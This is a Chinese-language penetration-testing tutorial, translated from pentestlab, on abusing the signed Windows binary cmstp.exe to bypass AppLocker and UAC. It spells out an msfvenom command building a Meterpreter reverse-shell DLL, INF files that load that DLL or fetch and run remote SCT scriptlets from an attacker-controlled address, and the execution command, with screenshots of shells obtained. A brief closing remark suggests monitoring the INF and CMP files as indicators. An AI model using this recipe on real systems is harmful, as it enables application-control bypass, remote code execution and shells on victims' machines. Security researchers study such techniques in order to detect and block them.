**CMSTP是一个与Microsoft连接管理器配置文件安装程序关联的二进制文件。它接受INF文件，这些文件可以通过恶意命令武器化，以脚本（SCT）和DLL的形式执行任意代码。它是一个受信任的Microsoft二进制文件，位于以下两个Windows目录中。**

    
    
    C:\Windows\System32\cmstp.exe
    C:\Windows\SysWOW64\cmstp.exe

AppLocker默认规则允许在这些文件夹中执行二进制文件，因此我们可以用它来作为bypass的一种方法。该方法最初是由[Oddvar
Moe](https://twitter.com/Oddvarmoe)发现的，使用这个二进制文件可以绕过AppLocker和UAC，具体可以[参阅他的博文](https://oddvar.moe/2017/08/15/research-on-cmstp-exe/)。

## DLL

通过Metasploit Framework的msfvenom生成恶意DLL文件。

    
    
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.2 LPORT=4444 -f dll &ampampgt; /root/Desktop/pentestlab.dll

![1metasploit-dll-generation.png](https://image.3001.net/images/20180522/15269462299068.png!small)

INF文件的 **RegisterOCXSection** 需要包含恶意DLL文件的本地路径或远程执行的WebDAV位置。

    
    
    [version]
    Signature=$chicago$
    AdvancedINF=2.5
    [DefaultInstall_SingleUser]
    RegisterOCXs=RegisterOCXSection
    [RegisterOCXSection]
    C:\Users\test.PENTESTLAB\pentestlab.dll
    [Strings]
    AppAct = "SOFTWARE\Microsoft\Connection Manager"
    ServiceName="Pentestlab"
    ShortSvcName="Pentestlab"

![2cmstp-local-dll-execution.png](https://image.3001.net/images/20180522/15269462477818.png!small)

Metasploit multi/handler模块需要配置为接收连接。

![3cmstp-metasploit-multi-handler.png](https://image.3001.net/images/20180522/15269462644718.png!small)

当恶意INF文件与cmstp一起提供时，代码将会在后台执行。

    
    
    cmstp.exe /s cmstp.inf

![4cmstp-inf-execution-locally.png](https://image.3001.net/images/20180522/15269462819253.png!small)

Meterpreter会话将从DLL执行中打开。

![5cmstp-meterpreter-via-dll-execution.png](https://image.3001.net/images/20180522/15269462976688.png!small)

## SCT

除了DLL文件外，cmstp还能够运行SCT文件，这在红队操作中扩展了二进制的可用性。 [Nick
Tyrer](https://twitter.com/nickTyrer/)最初通过[Twitter](https://twitter.com/NickTyrer/status/958450014111633408)展示了这种能力。

[Nick
Tyrer](https://twitter.com/nickTyrer/)还编写了一个名为powersct.sct的scriptlet，可以将其用作执行PowerShell命令的备选解决方案，以应对本机PowerShell被阻止的情况。
**UnRegisterOCXSection** 需要包含scriptlet的URL。最终的INF文件需要包含以下内容：

    
    
    [version]
    Signature=$chicago$
    AdvancedINF=2.5
    [DefaultInstall_SingleUser]
    UnRegisterOCXs=UnRegisterOCXSection
    [UnRegisterOCXSection]
    %11%\scrobj.dll,NI,http://10.0.0.2/tmp/powersct.sct
    [Strings]
    AppAct = "SOFTWARE\Microsoft\Connection Manager"
    ServiceName="Pentestlab"
    ShortSvcName="Pentestlab"

当INF文件被执行一个新的窗口将打开，这将允许用户执行PowerShell命令。

    
    
    cmstp.exe /s cmstp.inf

![6cmstp-powershell.png](https://image.3001.net/images/20180522/15269463196168.png!small)

代码执行也可以通过使用scriptlet来调用恶意可执行文件。INF文件需要包含scriptlet的远程位置。

    
    
    [version]
    Signature=$chicago$
    AdvancedINF=2.5
    [DefaultInstall_SingleUser]
    UnRegisterOCXs=UnRegisterOCXSection
    [UnRegisterOCXSection]
    %11%\scrobj.dll,NI,http://10.0.0.2/tmp/pentestlab.sct
    [Strings]
    AppAct = "SOFTWARE\Microsoft\Connection Manager"
    ServiceName="Pentestlab"
    ShortSvcName="Pentestlab"

![7cmstp-sct-execution.png](https://image.3001.net/images/20180522/15269463399807.png!small)

在执行INF文件时，将会打开一个新的命令提示符窗口，这表示代码已被成功执行。

![8cmstp-inf-execution-with-scriptlet.png](https://image.3001.net/images/20180522/15269463622233.png!small)

成功获取到一个Meterpreter会话。

![9cmstp-meterpreter-via-sct-execution.png](https://image.3001.net/images/20180522/15269463794828.png!small)

## 总结

使用CMSTP二进制来绕过Apple限制和代码执行。CMSTP需要INF文件并在执行时生成一个CMP文件，它是连接管理器设置文件。因此，如果[恶意攻击者](https://www.fireeye.com/blog/threat-research/2018/03/iranian-threat-group-updates-ttps-in-spear-phishing-campaign.html)已经开始使用此技术，且CMSTP.EXE二进制无法被AppLocker规则阻止的情况下，则需要将这两个文件作为IoC进行监视。

![10cmstp-inf-and-cmp-file.png](https://image.3001.net/images/20180522/15269464011035.png!small)

## 参考

<https://gist.github.com/netbiosX/15c963465bf1e78969fb3347c43b45b9>

<https://gist.github.com/netbiosX/297ea22d3475bb7216a7525f1ee82568>

<https://gist.github.com/NickTyrer/0604bb9d7bcfef9e0cf82c28a7b76f0f/>

<https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80>

<https://msitpros.com/?p=3960>

<https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/>

<https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/>

 ***参考来源：[pentestlab](https://pentestlab.blog/2018/05/10/applocker-bypass-cmstp/)，FB小编 secist 编译，转载请注明来自FreeBuf.COM**  

